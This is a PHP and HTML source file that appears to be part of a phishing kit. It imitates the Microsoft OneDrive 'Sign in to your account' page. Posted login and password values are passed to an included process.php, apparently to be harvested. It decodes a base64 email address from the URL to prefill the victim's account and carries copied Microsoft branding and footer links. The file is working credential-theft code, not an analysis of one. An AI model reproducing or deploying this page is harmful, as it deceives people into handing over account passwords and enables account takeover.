<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{

$login = $_GET['login'];
if (strpos($login,'@') !== false){
$log=$login;
}else{
$log=base64_decode($login);}
$prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
?>
<html dir="ltr" lang="EN-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta property="og:image" content="thumb.png"/>
<title>Sign in to your account</title>
<meta name="description" content="Sign in to your OneDrive cloud storage and Office Online.">
<link rel="shortcut icon" href="../mx/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />
<link crossorigin="anonymous" href="../mx/sprite1.mouse.css" rel="stylesheet"/>
<style type="text/css">
body.cb input.hip {
	border-width: 2px !important;
}
</style>
<style type="text/css">
body {
	display: none;
}
</style>
<script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script>
<style type="text/css">
body {
	display: block !important;
}
</style>
 
 
</head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<!--  -->
<div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
  <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl -->
    <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(../mx/0-small.jpg)"></div>
    <!-- /ko --><!-- ko if: backgroundImageUrl -->
    <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(../mx/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg);"></div>
    <!-- /ko --><!-- ko if: !!backgroundImageUrl() --> <!-- /ko --> </div>
</div>
<?php  


include('pat.php');

?>
</div>
<!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko -->
<div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
  <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                moreInfoClick: footer_onShowDebugDetails } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense -->
    <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.B5">©2018 MS</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --> 
      
      <img class="desktopMode" role="presentation" pngsrc="../mx/ele_oka_5ac590ee72bfe06a7cecfd75b588ad73.svg" svgsrc="../mx/ele_oka_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="../mx/ele_oka_5ac590ee72bfe06a7cecfd75b588ad73.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="../mx/ele_olu_2b5d393db04a5e6e1f739cb266e65b4c.svg" svgsrc="../mx/ele_olu_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="../mx/ele_olu_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div>
    <!-- /ko --></div>
</div>
</div>
</body>
</html><?php

}?>